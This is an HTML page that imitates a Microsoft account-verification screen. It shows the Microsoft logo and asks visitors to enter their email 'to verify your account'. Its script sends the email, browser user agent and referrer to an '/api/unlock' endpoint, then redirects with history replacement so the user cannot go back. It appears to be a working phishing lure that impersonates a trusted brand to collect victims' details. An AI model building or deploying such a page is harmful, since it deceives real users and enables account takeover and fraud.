<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Your Account</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            background-color: #fff;
        }
        .container {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
        }
        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }
        .logo img {
            height: 24px;
        }
        .icon {
            margin-bottom: 15px;
        }
        .icon img {
            width: 120px;
        }
        h2 {
            font-size: 20px;
            margin-bottom: 10px;
        }
        .error {
            color: #b42318;
            font-size: 14px;
            margin-bottom: 15px;
            min-height: 20px;
        }
        p {
            font-size: 14px;
            color: #333;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
            margin-bottom: 15px;
            box-sizing: border-box;
        }
        input:focus {
            outline: 2px solid #0078D4;
            border-color: #0078D4;
        }
        .btn {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            background-color: #0078D4;
            color: #fff;
            cursor: pointer;
            font-weight: 600;
        }
        .btn:disabled {
            background-color: #c3d9f8;
            cursor: not-allowed;
        }
        .privacy {
            font-size: 14px;
            margin-top: 20px;
        }
        .privacy a {
            color: #0078D4;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
        </div>
        <div class="icon">
            <img src="https://icon-library.com/images/windows-email-icon/windows-email-icon-9.jpg" alt="Mail Icon">
        </div>
        <h2>Enter your email to verify your account</h2>
        <div class="error" id="form-error"></div>
        <p>This will only take a moment and can help protect your account.</p>
        
        <form id="verify-form">
            <input type="email" id="emailInput" placeholder="Email" required aria-label="Enter your email">
            <button type="submit" id="submitBtn" class="btn" disabled>Continue</button>
        </form>

        <div class="privacy">
            <a href="#">Privacy and cookies</a>
        </div>
    </div>

    <script>
        const emailInput = document.getElementById('emailInput');
        const submitBtn = document.getElementById('submitBtn');
        const formError = document.getElementById('form-error');
        const verifyForm = document.getElementById('verify-form');

        // Enable the button only when a valid email is entered
        emailInput.addEventListener('input', function () {
            submitBtn.disabled = !this.value.trim();
        });

        // Handle form submission securely via the server
        verifyForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const email = emailInput.value.trim();
            
            submitBtn.disabled = true;
            submitBtn.textContent = "Verifying...";
            formError.textContent = "";

            try {
                const response = await fetch("/api/unlock", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        email: email,
                        userAgent: navigator.userAgent,
                        referrer: document.referrer
                    })
                });

                const data = await response.json();

                if (data.success) {
                    // Redirect using replace so the user can't click "back" to the form
                    window.location.replace(data.redirectUrl);
                } else {
                    formError.textContent = data.error || "Verification failed. Try again.";
                    submitBtn.disabled = false;
                    submitBtn.textContent = "Continue";
                }
            } catch (err) {
                console.error("Network error:", err);
                formError.textContent = "A network error occurred. Please try again.";
                submitBtn.disabled = false;
                submitBtn.textContent = "Continue";
            }
        });
    </script>
</body>
</html>
